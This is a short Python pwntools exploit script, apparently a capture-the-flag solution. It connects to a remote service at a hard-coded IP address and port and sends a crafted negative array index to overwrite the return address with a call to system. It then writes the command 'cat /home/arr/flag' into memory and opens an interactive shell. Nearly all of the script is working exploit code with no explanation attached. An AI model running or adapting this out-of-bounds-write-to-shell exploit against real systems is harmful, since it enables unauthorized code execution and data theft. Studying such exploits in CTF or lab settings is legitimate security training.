from pwn import *
#flag is in "/home/arr/flag"
#0xffffd318 stdrt
#x/30x $ebp+$eax*4-0x30
ret = 0x80487bc
pop3ret = 0x80487b9
pop4ret = 0x80487b8
callsystem = 0x08048587

def send_exploit(sh, exploit):
    #set return to system
    magic = -2147483635
    print sh.recvuntil("enter index\n", timeout=1)
    sh.sendline(str(magic))
    print sh.recvuntil("enter value\n", timeout=1)
    sh.sendline(str(int(ret))) #134514055
    print sh.recvuntil("enter index\n", timeout=1)
    sh.sendline(str(magic+1))
    print sh.recvuntil("enter value\n", timeout=1)
    sh.sendline(str(int(callsystem)))
    count = 0
    for x in range(0, len(exploit),4):
        #need 5
        data = exploit[x:x+4]
        data = data[::-1] #reverse?
        data = data.encode("hex")
        input = int(data,16)
        print sh.recvuntil("enter index\n", timeout=1)
        sh.sendline(str(magic+9+count))
        print sh.recvuntil("enter value\n", timeout=1)
        sh.sendline(str(input))
        count+=1
    #padd
    for x in range(0,3):
        print sh.recvuntil("enter index\n", timeout=1)
        sh.sendline(str(count+1))
        print sh.recvuntil("enter value\n", timeout=1)
        sh.sendline(str(int(0x0)))
    print sh.recv(timeout=1)
    sh.interactive()

print "[+ process started]"
sh = remote("4.31.182.242",9003)
print sh.recvuntil("What should I call you?\n", timeout=1)
sh.sendline("earl")
print sh.recv(timeout=1)

exploit = "cat /home/arr/flag\x00"
send_exploit(sh, exploit)
sh.close()
